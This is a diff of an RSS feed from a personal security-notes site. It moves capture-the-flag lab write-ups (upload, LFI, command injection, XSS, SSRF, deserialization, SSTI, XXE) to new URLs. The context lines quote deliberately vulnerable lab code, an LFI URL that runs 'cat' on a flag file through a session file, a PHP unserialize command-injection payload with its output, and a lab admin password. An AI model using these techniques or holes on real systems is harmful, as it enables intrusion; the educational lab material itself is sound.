  echo &amp;#34;&amp;lt;img src=\&amp;#34;/images/${prefix}_${filename}\&amp;#34;&amp;gt;&amp;#34;;
 ?&amp;gt;
-&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>Simple Web 0x06(Lab - Image Space 0x03)</title><link>https://bernie6401.github.io/security/course/ntust-ws/upload/simple-web-0x06lab---image-space-0x03/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntust-ws/upload/simple-web-0x06lab---image-space-0x03/</guid><description>&lt;h1 id="simple-web-0x06lab---image-space-0x03">
+&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>Simple Web 0x06(Lab - Image Space 0x03)</title><link>https://bernie6401.github.io/docs/security/course/ntust-ws/upload/simple-web-0x06lab---image-space-0x03/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntust-ws/upload/simple-web-0x06lab---image-space-0x03/</guid><description>&lt;h1 id="simple-web-0x06lab---image-space-0x03">
  Simple Web 0x06(Lab - Image Space 0x03)
  &lt;a class="anchor" href="#simple-web-0x06lab---image-space-0x03">#&lt;/a>
 &lt;/h1>
@@ -2253,7 +2253,7 @@ if __name__ == &amp;#39;__main__&amp;#39;:
  echo &amp;#34;&amp;lt;img src=\&amp;#34;/images/${prefix}_${filename}\&amp;#34;&amp;gt;&amp;#34;;
 ?&amp;gt;
 &lt;/code>&lt;/pre>&lt;p>:::
-It has 2 extra constraint must be bypassed. Use &lt;code>burpsuite&lt;/code> and change valid file signature&lt;/p></description></item><item><title>Simple Web 0x07(Lab - `HakkaMD`)</title><link>https://bernie6401.github.io/security/course/ntust-ws/lfi/simple-web-0x07lab---hakkamd/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntust-ws/lfi/simple-web-0x07lab---hakkamd/</guid><description>&lt;h1 id="simple-web-0x07lab---hakkamd">
+It has 2 extra constraint must be bypassed. Use &lt;code>burpsuite&lt;/code> and change valid file signature&lt;/p></description></item><item><title>Simple Web 0x07(Lab - `HakkaMD`)</title><link>https://bernie6401.github.io/docs/security/course/ntust-ws/lfi/simple-web-0x07lab---hakkamd/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntust-ws/lfi/simple-web-0x07lab---hakkamd/</guid><description>&lt;h1 id="simple-web-0x07lab---hakkamd">
  Simple Web 0x07(Lab - &lt;code>HakkaMD&lt;/code>)
  &lt;a class="anchor" href="#simple-web-0x07lab---hakkamd">#&lt;/a>
 &lt;/h1>
@@ -2291,7 +2291,7 @@ We can see that session file store the data of what we enter. Therefore, we coul
 ↓
 &lt;code>http://h4ck3r.quest:8401/?module=/tmp/sess_2f0dilri9ju4553th2bkclefal&amp;amp;sh=cat%20/flag_aff6136bbef82137&lt;/code>&lt;/li>
 &lt;li>Then we got flag!!!&lt;/li>
-&lt;/ol></description></item><item><title>Simple Web 0x08(Lab - My First Meow Website)</title><link>https://bernie6401.github.io/security/course/ntust-ws/lfi/simple-web-0x08lab---my-first-meow-website/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntust-ws/lfi/simple-web-0x08lab---my-first-meow-website/</guid><description>&lt;h1 id="simple-web-0x08lab---my-first-meow-website">
+&lt;/ol></description></item><item><title>Simple Web 0x08(Lab - My First Meow Website)</title><link>https://bernie6401.github.io/docs/security/course/ntust-ws/lfi/simple-web-0x08lab---my-first-meow-website/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntust-ws/lfi/simple-web-0x08lab---my-first-meow-website/</guid><description>&lt;h1 id="simple-web-0x08lab---my-first-meow-website">
  Simple Web 0x08(Lab - My First Meow Website)
  &lt;a class="anchor" href="#simple-web-0x08lab---my-first-meow-website">#&lt;/a>
 &lt;/h1>
@@ -2384,7 +2384,7 @@ if (
 ?&amp;gt;
 &lt;/code>&lt;/pre>:::&lt;/li>
 &lt;li>Then we get admin password is: &lt;code>kqqPFObwxU8HYo8E5QgNLhdOxvZmtPhyBCyDxCwpvAQ&lt;/code>. Then we got flag!!!&lt;/li>
-&lt;/ol></description></item><item><title>Simple Web 0x09(Lab - DNS Lookup Tool)</title><link>https://bernie6401.github.io/security/course/ntust-ws/command-injection/simple-web-0x09lab---dns-lookup-tool/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntust-ws/command-injection/simple-web-0x09lab---dns-lookup-tool/</guid><description>&lt;h1 id="simple-web-0x09lab---dns-lookup-tool">
+&lt;/ol></description></item><item><title>Simple Web 0x09(Lab - DNS Lookup Tool)</title><link>https://bernie6401.github.io/docs/security/course/ntust-ws/command-injection/simple-web-0x09lab---dns-lookup-tool/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntust-ws/command-injection/simple-web-0x09lab---dns-lookup-tool/</guid><description>&lt;h1 id="simple-web-0x09lab---dns-lookup-tool">
  Simple Web 0x09(Lab - DNS Lookup Tool)
  &lt;a class="anchor" href="#simple-web-0x09lab---dns-lookup-tool">#&lt;/a>
 &lt;/h1>
@@ -2455,7 +2455,7 @@ isset($_GET[&amp;#39;source&amp;#39;]) and die(show_source(__FILE__, true));
 &amp;lt;/body&amp;gt;
 
 &amp;lt;/html&amp;gt; 
-&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>Simple Web 0x10(Lab - DNS Lookup Tool | WAF)</title><link>https://bernie6401.github.io/security/course/ntust-ws/command-injection/simple-web-0x10lab---dns-lookup-tool-_-waf/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntust-ws/command-injection/simple-web-0x10lab---dns-lookup-tool-_-waf/</guid><description>&lt;h1 id="simple-web-0x10lab---dns-lookup-tool--waf">
+&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>Simple Web 0x10(Lab - DNS Lookup Tool | WAF)</title><link>https://bernie6401.github.io/docs/security/course/ntust-ws/command-injection/simple-web-0x10lab---dns-lookup-tool-_-waf/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntust-ws/command-injection/simple-web-0x10lab---dns-lookup-tool-_-waf/</guid><description>&lt;h1 id="simple-web-0x10lab---dns-lookup-tool--waf">
  Simple Web 0x10(Lab - DNS Lookup Tool | WAF)
  &lt;a class="anchor" href="#simple-web-0x10lab---dns-lookup-tool--waf">#&lt;/a>
 &lt;/h1>
@@ -2534,7 +2534,7 @@ isset($_GET[&amp;#39;source&amp;#39;]) and die(show_source(__FILE__, true));
 
 &amp;lt;/html&amp;gt; 
 &lt;/code>&lt;/pre>&lt;p>:::
-It set some protection such as blacklist.&lt;/p></description></item><item><title>Simple Web 0x11(Lab - XSS Me)</title><link>https://bernie6401.github.io/security/course/ntust-ws/fronted/simple-web-0x11lab---xss-me/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntust-ws/fronted/simple-web-0x11lab---xss-me/</guid><description>&lt;h1 id="simple-web-0x11lab---xss-me">
+It set some protection such as blacklist.&lt;/p></description></item><item><title>Simple Web 0x11(Lab - XSS Me)</title><link>https://bernie6401.github.io/docs/security/course/ntust-ws/fronted/simple-web-0x11lab---xss-me/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntust-ws/fronted/simple-web-0x11lab---xss-me/</guid><description>&lt;h1 id="simple-web-0x11lab---xss-me">
  Simple Web 0x11(Lab - XSS Me)
  &lt;a class="anchor" href="#simple-web-0x11lab---xss-me">#&lt;/a>
 &lt;/h1>
@@ -2599,7 +2599,7 @@ If you login as guest(password = guest), then you can get the response
 &lt;ol start="3">
 &lt;li>
 &lt;p>Fetch flag and send to &lt;a href="https://beeceptor.com/">beeceptor&lt;/a>
-Payload:&lt;/p></description></item><item><title>Simple Web 0x12(Lab - Web Preview Card)</title><link>https://bernie6401.github.io/security/course/ntu-cs/web/simple-web---0x15lab---web-preview-card/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-cs/web/simple-web---0x15lab---web-preview-card/</guid><description>&lt;h1 id="simple-web-0x12lab---web-preview-card">
+Payload:&lt;/p></description></item><item><title>Simple Web 0x12(Lab - Web Preview Card)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/web/simple-web---0x15lab---web-preview-card/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/web/simple-web---0x15lab---web-preview-card/</guid><description>&lt;h1 id="simple-web-0x12lab---web-preview-card">
  Simple Web 0x12(Lab - Web Preview Card)
  &lt;a class="anchor" href="#simple-web-0x12lab---web-preview-card">#&lt;/a>
 &lt;/h1>
@@ -2640,7 +2640,7 @@ if ($_SERVER[&amp;#39;REMOTE_ADDR&amp;#39;] !== &amp;#39;127.0.0.1&amp;#39;) die
 if (isset($_POST[&amp;#39;givemeflag&amp;#39;]) &amp;amp;&amp;amp; $_POST[&amp;#39;givemeflag&amp;#39;] === &amp;#39;yes&amp;#39;)
  echo &amp;#34;FLAG:&amp;#34;, getenv(&amp;#39;FLAG&amp;#39;);
 &lt;/code>&lt;/pre>&lt;p>:::
-If you want flag, you need visit &lt;code>/flag.php&lt;/code> as localhost and send a form data with parameter &lt;code>givemeflag&lt;/code>.&lt;/p></description></item><item><title>Simple Web 0x12(Lab - Web Preview Card)</title><link>https://bernie6401.github.io/security/course/ntust-ws/ssrf/simple-web-0x12lab---web-preview-card/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntust-ws/ssrf/simple-web-0x12lab---web-preview-card/</guid><description>&lt;h1 id="simple-web-0x12lab---web-preview-card">
+If you want flag, you need visit &lt;code>/flag.php&lt;/code> as localhost and send a form data with parameter &lt;code>givemeflag&lt;/code>.&lt;/p></description></item><item><title>Simple Web 0x12(Lab - Web Preview Card)</title><link>https://bernie6401.github.io/docs/security/course/ntust-ws/ssrf/simple-web-0x12lab---web-preview-card/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntust-ws/ssrf/simple-web-0x12lab---web-preview-card/</guid><description>&lt;h1 id="simple-web-0x12lab---web-preview-card">
  Simple Web 0x12(Lab - Web Preview Card)
  &lt;a class="anchor" href="#simple-web-0x12lab---web-preview-card">#&lt;/a>
 &lt;/h1>
@@ -2681,7 +2681,7 @@ if ($_SERVER[&amp;#39;REMOTE_ADDR&amp;#39;] !== &amp;#39;127.0.0.1&amp;#39;) die
 if (isset($_POST[&amp;#39;givemeflag&amp;#39;]) &amp;amp;&amp;amp; $_POST[&amp;#39;givemeflag&amp;#39;] === &amp;#39;yes&amp;#39;)
  echo &amp;#34;FLAG:&amp;#34;, getenv(&amp;#39;FLAG&amp;#39;);
 &lt;/code>&lt;/pre>&lt;p>:::
-If you want flag, you need visit &lt;code>/flag.php&lt;/code> as localhost and send a form data with parameter &lt;code>givemeflag&lt;/code>.&lt;/p></description></item><item><title>Simple Web 0x13(Lab - SSRFrog)</title><link>https://bernie6401.github.io/security/course/ntust-ws/ssrf/simple-web-0x13lab---ssrfrog/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntust-ws/ssrf/simple-web-0x13lab---ssrfrog/</guid><description>&lt;h1 id="simple-web-0x13lab---ssrfrog">
+If you want flag, you need visit &lt;code>/flag.php&lt;/code> as localhost and send a form data with parameter &lt;code>givemeflag&lt;/code>.&lt;/p></description></item><item><title>Simple Web 0x13(Lab - SSRFrog)</title><link>https://bernie6401.github.io/docs/security/course/ntust-ws/ssrf/simple-web-0x13lab---ssrfrog/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntust-ws/ssrf/simple-web-0x13lab---ssrfrog/</guid><description>&lt;h1 id="simple-web-0x13lab---ssrfrog">
  Simple Web 0x13(Lab - SSRFrog)
  &lt;a class="anchor" href="#simple-web-0x13lab---ssrfrog">#&lt;/a>
 &lt;/h1>
@@ -2728,7 +2728,7 @@ app.get(&amp;#39;/&amp;#39;, (req, res) =&amp;gt; {
 });
 
 app.listen(3000, &amp;#39;0.0.0.0&amp;#39;);
-&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>Simple Web 0x14(Lab - Debug)</title><link>https://bernie6401.github.io/security/course/ntust-ws/ssrf/simple-web-0x14lab---debug/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntust-ws/ssrf/simple-web-0x14lab---debug/</guid><description>&lt;h1 id="simple-web-0x14lab---debug">
+&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>Simple Web 0x14(Lab - Debug)</title><link>https://bernie6401.github.io/docs/security/course/ntust-ws/ssrf/simple-web-0x14lab---debug/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntust-ws/ssrf/simple-web-0x14lab---debug/</guid><description>&lt;h1 id="simple-web-0x14lab---debug">
  Simple Web 0x14(Lab - Debug)
  &lt;a class="anchor" href="#simple-web-0x14lab---debug">#&lt;/a>
 &lt;/h1>
@@ -2790,7 +2790,7 @@ def source():
  source_code = open(__file__).read()
  source_code = re.sub(r&amp;#39;FLAG{.*}&amp;#39;, r&amp;#39;FL4G{fake_flag}&amp;#39;, source_code, count=1)
  return Response(source_code, mimetype=&amp;#39;text/plain&amp;#39;)
-&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>Simple Web 0x15.5(Pickle)</title><link>https://bernie6401.github.io/security/course/ntust-ws/deserialization/simple-web-0x15.5pickle/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntust-ws/deserialization/simple-web-0x15.5pickle/</guid><description>&lt;h1 id="simple-web-0x155pickle">
+&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>Simple Web 0x15.5(Pickle)</title><link>https://bernie6401.github.io/docs/security/course/ntust-ws/deserialization/simple-web-0x15.5pickle/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntust-ws/deserialization/simple-web-0x15.5pickle/</guid><description>&lt;h1 id="simple-web-0x155pickle">
  Simple Web 0x15.5(Pickle)
  &lt;a class="anchor" href="#simple-web-0x155pickle">#&lt;/a>
 &lt;/h1>
@@ -2831,7 +2831,7 @@ print(pickletools.dis(optim_s))
 
 serialized = bytes.fromhex(input(&amp;#39;Data: &amp;#39;))
 pickle.loads(serialized)
-&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>Simple Web 0x15(Lab - `Jinja`)</title><link>https://bernie6401.github.io/security/course/ntust-ws/ssti/simple-web-0x15lab---jinja/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntust-ws/ssti/simple-web-0x15lab---jinja/</guid><description>&lt;h1 id="simple-web-0x15lab---jinja">
+&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>Simple Web 0x15(Lab - `Jinja`)</title><link>https://bernie6401.github.io/docs/security/course/ntust-ws/ssti/simple-web-0x15lab---jinja/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntust-ws/ssti/simple-web-0x15lab---jinja/</guid><description>&lt;h1 id="simple-web-0x15lab---jinja">
  Simple Web 0x15(Lab - &lt;code>Jinja&lt;/code>)
  &lt;a class="anchor" href="#simple-web-0x15lab---jinja">#&lt;/a>
 &lt;/h1>
@@ -2879,7 +2879,7 @@ def source():
 
 if __name__ == &amp;#39;__main__&amp;#39;:
  app.run(threaded=True, debug=True)
-&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>Simple Web 0x16.5(php unserialize)</title><link>https://bernie6401.github.io/security/course/ntust-ws/deserialization/simple-web-0x16.5php-unserialize/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntust-ws/deserialization/simple-web-0x16.5php-unserialize/</guid><description>&lt;h1 id="simple-web-0x165php-unserialize">
+&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>Simple Web 0x16.5(php unserialize)</title><link>https://bernie6401.github.io/docs/security/course/ntust-ws/deserialization/simple-web-0x16.5php-unserialize/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntust-ws/deserialization/simple-web-0x16.5php-unserialize/</guid><description>&lt;h1 id="simple-web-0x165php-unserialize">
  Simple Web 0x16.5(php unserialize)
  &lt;a class="anchor" href="#simple-web-0x165php-unserialize">#&lt;/a>
 &lt;/h1>
@@ -2926,7 +2926,7 @@ php &amp;gt; $_GET[&amp;#39;cat&amp;#39;]=&amp;#39;O:3:&amp;#34;cat&amp;#34;:1:{
 php &amp;gt; $cat = unserialize($_GET[&amp;#39;cat&amp;#39;]);
 
 uid=1000(sbk6401) gid=1000(sbk6401) groups=1000(sbk6401),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),117(netdev),1001(docker)
-&lt;/code>&lt;/pre>&lt;p>This is a typical command injection. The magic method &lt;code>__wakeup()&lt;/code> will be called when unserialized something.&lt;/p></description></item><item><title>Simple Web 0x16(Lab - Pickle)</title><link>https://bernie6401.github.io/security/course/ntu-cs/web/simple-web---0x11lab---pickle/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-cs/web/simple-web---0x11lab---pickle/</guid><description>&lt;h1 id="simple-web-0x16lab---pickle">
+&lt;/code>&lt;/pre>&lt;p>This is a typical command injection. The magic method &lt;code>__wakeup()&lt;/code> will be called when unserialized something.&lt;/p></description></item><item><title>Simple Web 0x16(Lab - Pickle)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/web/simple-web---0x11lab---pickle/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/web/simple-web---0x11lab---pickle/</guid><description>&lt;h1 id="simple-web-0x16lab---pickle">
  Simple Web 0x16(Lab - Pickle)
  &lt;a class="anchor" href="#simple-web-0x16lab---pickle">#&lt;/a>
 &lt;/h1>
@@ -2981,7 +2981,7 @@ def login():
  resp = make_response(redirect(&amp;#39;/&amp;#39;))
  resp.set_cookie(&amp;#34;session&amp;#34;, user)
  return resp
-&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>Simple Web 0x16(Lab - Pickle)</title><link>https://bernie6401.github.io/security/course/ntust-ws/deserialization/simple-web-0x16lab---pickle/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntust-ws/deserialization/simple-web-0x16lab---pickle/</guid><description>&lt;h1 id="simple-web-0x16lab---pickle">
+&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>Simple Web 0x16(Lab - Pickle)</title><link>https://bernie6401.github.io/docs/security/course/ntust-ws/deserialization/simple-web-0x16lab---pickle/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntust-ws/deserialization/simple-web-0x16lab---pickle/</guid><description>&lt;h1 id="simple-web-0x16lab---pickle">
  Simple Web 0x16(Lab - Pickle)
  &lt;a class="anchor" href="#simple-web-0x16lab---pickle">#&lt;/a>
 &lt;/h1>
@@ -3036,7 +3036,7 @@ def login():
  resp = make_response(redirect(&amp;#39;/&amp;#39;))
  resp.set_cookie(&amp;#34;session&amp;#34;, user)
  return resp
-&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>Simple Web 0x17(Lab - Baby Cat)</title><link>https://bernie6401.github.io/security/course/ntu-cs/web/simple-web---0x12lab---baby-cat/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-cs/web/simple-web---0x12lab---baby-cat/</guid><description>&lt;h1 id="simple-web-0x17lab---baby-cat">
+&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>Simple Web 0x17(Lab - Baby Cat)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/web/simple-web---0x12lab---baby-cat/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/web/simple-web---0x12lab---baby-cat/</guid><description>&lt;h1 id="simple-web-0x17lab---baby-cat">
  Simple Web 0x17(Lab - Baby Cat)
  &lt;a class="anchor" href="#simple-web-0x17lab---baby-cat">#&lt;/a>
 &lt;/h1>
@@ -3082,7 +3082,7 @@ if (!isset($_COOKIE[&amp;#39;cat_session&amp;#39;])) {
 ?&amp;gt;
 &amp;lt;p&amp;gt;Hello, &amp;lt;?= $cat-&amp;gt;name ?&amp;gt;.&amp;lt;/p&amp;gt;
 &amp;lt;a href=&amp;#34;/?source&amp;#34;&amp;gt;source code&amp;lt;/a&amp;gt;
-&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>Simple Web 0x17(Lab - Baby Cat)</title><link>https://bernie6401.github.io/security/course/ntust-ws/deserialization/simple-web-0x17lab---baby-cat/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntust-ws/deserialization/simple-web-0x17lab---baby-cat/</guid><description>&lt;h1 id="simple-web-0x17lab---baby-cat">
+&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>Simple Web 0x17(Lab - Baby Cat)</title><link>https://bernie6401.github.io/docs/security/course/ntust-ws/deserialization/simple-web-0x17lab---baby-cat/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntust-ws/deserialization/simple-web-0x17lab---baby-cat/</guid><description>&lt;h1 id="simple-web-0x17lab---baby-cat">
  Simple Web 0x17(Lab - Baby Cat)
  &lt;a class="anchor" href="#simple-web-0x17lab---baby-cat">#&lt;/a>
 &lt;/h1>
@@ -3128,7 +3128,7 @@ if (!isset($_COOKIE[&amp;#39;cat_session&amp;#39;])) {
 ?&amp;gt;
 &amp;lt;p&amp;gt;Hello, &amp;lt;?= $cat-&amp;gt;name ?&amp;gt;.&amp;lt;/p&amp;gt;
 &amp;lt;a href=&amp;#34;/?source&amp;#34;&amp;gt;source code&amp;lt;/a&amp;gt;
-&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>Simple Web 0x18(Lab - Magic Cat)</title><link>https://bernie6401.github.io/security/course/ntu-cs/web/simple-web---0x13lab---magic-cat/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-cs/web/simple-web---0x13lab---magic-cat/</guid><description>&lt;h1 id="simple-web-0x18lab---magic-cat">
+&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>Simple Web 0x18(Lab - Magic Cat)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/web/simple-web---0x13lab---magic-cat/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/web/simple-web---0x13lab---magic-cat/</guid><description>&lt;h1 id="simple-web-0x18lab---magic-cat">
  Simple Web 0x18(Lab - Magic Cat)
  &lt;a class="anchor" href="#simple-web-0x18lab---magic-cat">#&lt;/a>
 &lt;/h1>
@@ -3201,7 +3201,7 @@ This is your 🐱:
 &amp;lt;p&amp;gt;Usage:&amp;lt;/p&amp;gt;
 &amp;lt;p&amp;gt;/?source&amp;lt;/p&amp;gt;
 &amp;lt;p&amp;gt;/?spell=the-spell-of-your-cat&amp;lt;/p&amp;gt;
-&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>Simple Web 0x18(Lab - Magic Cat)</title><link>https://bernie6401.github.io/security/course/ntust-ws/deserialization/simple-web-0x18lab---magic-cat/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntust-ws/deserialization/simple-web-0x18lab---magic-cat/</guid><description>&lt;h1 id="simple-web-0x18lab---magic-cat">
+&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>Simple Web 0x18(Lab - Magic Cat)</title><link>https://bernie6401.github.io/docs/security/course/ntust-ws/deserialization/simple-web-0x18lab---magic-cat/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntust-ws/deserialization/simple-web-0x18lab---magic-cat/</guid><description>&lt;h1 id="simple-web-0x18lab---magic-cat">
  Simple Web 0x18(Lab - Magic Cat)
  &lt;a class="anchor" href="#simple-web-0x18lab---magic-cat">#&lt;/a>
 &lt;/h1>
@@ -3274,7 +3274,7 @@ This is your 🐱:
 &amp;lt;p&amp;gt;Usage:&amp;lt;/p&amp;gt;
 &amp;lt;p&amp;gt;/?source&amp;lt;/p&amp;gt;
 &amp;lt;p&amp;gt;/?spell=the-spell-of-your-cat&amp;lt;/p&amp;gt;
-&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>Simple Web 0x19(Lab - PHP Login)</title><link>https://bernie6401.github.io/security/course/ntust-ws/language-feature/simple-web-0x19lab---php-login/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntust-ws/language-feature/simple-web-0x19lab---php-login/</guid><description>&lt;h1 id="simple-web-0x19lab---php-login">
+&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>Simple Web 0x19(Lab - PHP Login)</title><link>https://bernie6401.github.io/docs/security/course/ntust-ws/language-feature/simple-web-0x19lab---php-login/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntust-ws/language-feature/simple-web-0x19lab---php-login/</guid><description>&lt;h1 id="simple-web-0x19lab---php-login">
  Simple Web 0x19(Lab - PHP Login)
  &lt;a class="anchor" href="#simple-web-0x19lab---php-login">#&lt;/a>
 &lt;/h1>
@@ -3323,7 +3323,7 @@ highlight_file(__file__);
  Exploit
  &lt;a class="anchor" href="#exploit">#&lt;/a>
 &lt;/h2>
-&lt;p>Must change &lt;code>GET&lt;/code> method to &lt;code>POST&lt;/code> method and add &lt;code>Content-Type: application/x-www-form-urlencoded&lt;/code> in header&lt;/p></description></item><item><title>Simple Web 0x22(Lab - Pug)</title><link>https://bernie6401.github.io/security/course/ntust-ws/ssti/simple-web-0x22lab---pug/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntust-ws/ssti/simple-web-0x22lab---pug/</guid><description>&lt;h1 id="simple-web-0x22lab---pug">
+&lt;p>Must change &lt;code>GET&lt;/code> method to &lt;code>POST&lt;/code> method and add &lt;code>Content-Type: application/x-www-form-urlencoded&lt;/code> in header&lt;/p></description></item><item><title>Simple Web 0x22(Lab - Pug)</title><link>https://bernie6401.github.io/docs/security/course/ntust-ws/ssti/simple-web-0x22lab---pug/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntust-ws/ssti/simple-web-0x22lab---pug/</guid><description>&lt;h1 id="simple-web-0x22lab---pug">
  Simple Web 0x22(Lab - Pug)
  &lt;a class="anchor" href="#simple-web-0x22lab---pug">#&lt;/a>
 &lt;/h1>
@@ -3365,7 +3365,7 @@ app.get(&amp;#34;/source&amp;#34;, (_, res) =&amp;gt; {
 });
 
 app.listen(3000, () =&amp;gt; console.log(&amp;#39;:3000&amp;#39;));
-&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>Simple Web 0x23(Lab - XXE)</title><link>https://bernie6401.github.io/security/course/ntu-cs/web/simple-web---0x14lab---xxe/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-cs/web/simple-web---0x14lab---xxe/</guid><description>&lt;h1 id="simple-web-0x23lab---xxe">
+&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>Simple Web 0x23(Lab - XXE)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/web/simple-web---0x14lab---xxe/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/web/simple-web---0x14lab---xxe/</guid><description>&lt;h1 id="simple-web-0x23lab---xxe">
  Simple Web 0x23(Lab - XXE)
  &lt;a class="anchor" href="#simple-web-0x23lab---xxe">#&lt;/a>
 &lt;/h1>
@@ -3424,7 +3424,7 @@ app.listen(3000, () =&amp;gt; console.log(&amp;#39;:3000&amp;#39;));
 &lt;h2 id="reference">
  Reference
  &lt;a class="anchor" href="#reference">#&lt;/a>
